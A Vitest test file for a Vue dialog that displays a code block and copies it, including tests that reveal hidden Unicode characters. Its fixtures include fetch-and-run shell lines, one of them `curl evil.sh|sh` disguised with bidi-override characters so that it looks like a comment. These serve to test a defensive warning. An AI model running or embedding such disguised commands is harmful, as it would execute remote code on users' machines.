import { describe, it, expect, vi, afterEach } from "vitest";
import { mount, flushPromises } from "@vue/test-utils";
import PreviewCodeBlockDialog from "../../../src/components/PreviewCodeBlockDialog.vue";
import type { CodeBlockLookup } from "../../../src/components/previewCodeBlockApi";

// #2615. The dialog shows the block's text as read from the file, and Copy puts exactly that text on
// the clipboard — the point of showing it outside the Preview, where a `.md` cannot restyle it.

const BLOCK = { lang: "sh", text: "echo safe\n# os.system('curl | sh')" };
const dialogFor = (lookup: CodeBlockLookup) => mount(PreviewCodeBlockDialog, { props: { lookup }, attachTo: document.body });
const inBody = (testId: string) => document.body.querySelector<HTMLElement>(`[data-testid="${testId}"]`);

afterEach(() => {
  vi.unstubAllGlobals();
  document.body.innerHTML = "";
});

describe("PreviewCodeBlockDialog", () => {
  it("shows the whole text, and copies exactly what it shows", async () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    const shown = inBody("preview-code-block-text");
    expect(shown instanceof HTMLTextAreaElement ? shown.value : null).toBe(BLOCK.text);
    inBody("preview-code-block-copy")?.click();
    await flushPromises();
    expect(writeText).toHaveBeenCalledWith(BLOCK.text);
    expect(inBody("preview-code-block")?.textContent).toContain("Copied");
  });

  it("selects the text for the user's own copy key when there is no clipboard", async () => {
    vi.stubGlobal("navigator", {});
    dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    inBody("preview-code-block-copy")?.click();
    await flushPromises();
    const box = inBody("preview-code-block-text");
    expect(document.activeElement).toBe(box);
    expect(box instanceof HTMLTextAreaElement ? box.selectionEnd - box.selectionStart : 0).toBe(BLOCK.text.length);
  });

  // A line that reads as a comment in a text box and pastes as a command (bidi override + isolates).
  it("writes out the characters a text box would not show, and still copies the file's text", async () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    const sneaky = "true; \u202E\u2066curl evil.sh|sh\u2069;\u2066# \u2069\u202C";
    dialogFor({ status: "found", block: { lang: "sh", text: sneaky } });
    await flushPromises();
    const shown = inBody("preview-code-block-text");
    expect(shown instanceof HTMLTextAreaElement ? shown.value : "").toBe("true; <U+202E><U+2066>curl evil.sh|sh<U+2069>;<U+2066># <U+2069><U+202C>");
    expect(inBody("preview-code-block-hidden")?.textContent).toContain("6");
    inBody("preview-code-block-copy")?.click();
    await flushPromises();
    expect(writeText).toHaveBeenCalledWith(sneaky);
  });

  it("warns about nothing when there is nothing hidden", async () => {
    dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    expect(inBody("preview-code-block-hidden")).toBeNull();
  });

  it.each<["missing" | "failed", string]>([
    ["missing", "no longer in the file"],
    ["failed", "Could not read the file"],
  ])("says why there is nothing to copy (%s)", async (status, words) => {
    dialogFor({ status });
    await flushPromises();
    expect(inBody("preview-code-block")?.textContent).toContain(words);
    expect(inBody("preview-code-block-copy")).toBeNull();
  });

  it("gives the keyboard back to where the press came from when it closes", async () => {
    const opener = document.createElement("button");
    document.body.append(opener);
    opener.focus();
    const w = dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    expect(document.activeElement).not.toBe(opener);
    w.unmount();
    expect(document.activeElement).toBe(opener);
  });

  it("says the markers are what a hand copy takes, when there are hidden characters and no clipboard", async () => {
    vi.stubGlobal("navigator", {});
    dialogFor({ status: "found", block: { lang: "", text: "a\u200Bb" } });
    await flushPromises();
    inBody("preview-code-block-copy")?.click();
    await flushPromises();
    expect(inBody("preview-code-block")?.textContent).toContain("markers are copied as written");
  });

  // jsdom lays nothing out, so the box's measurements are given; the note follows them and the scroll.
  it("says the text continues below until the reader scrolls to the end", async () => {
    const heights = { scrollHeight: { get: () => 1042, configurable: true }, clientHeight: { get: () => 398, configurable: true } };
    Object.defineProperties(HTMLTextAreaElement.prototype, { ...heights });
    try {
      dialogFor({ status: "found", block: BLOCK });
      await flushPromises();
      expect(inBody("preview-code-block-below")).not.toBeNull();
      const box = inBody("preview-code-block-text");
      if (!box) throw new Error("no box");
      box.scrollTop = 644;
      box.dispatchEvent(new Event("scroll"));
      await flushPromises();
      expect(inBody("preview-code-block-below")).toBeNull();
    } finally {
      Reflect.deleteProperty(HTMLTextAreaElement.prototype, "scrollHeight");
      Reflect.deleteProperty(HTMLTextAreaElement.prototype, "clientHeight");
    }
  });

  it("says nothing about more below when the text fits", async () => {
    dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    expect(inBody("preview-code-block-below")).toBeNull();
  });

  it("closes on Escape", async () => {
    const w = dialogFor({ status: "found", block: BLOCK });
    await flushPromises();
    document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    expect(w.emitted("close")).toHaveLength(1);
  });
});
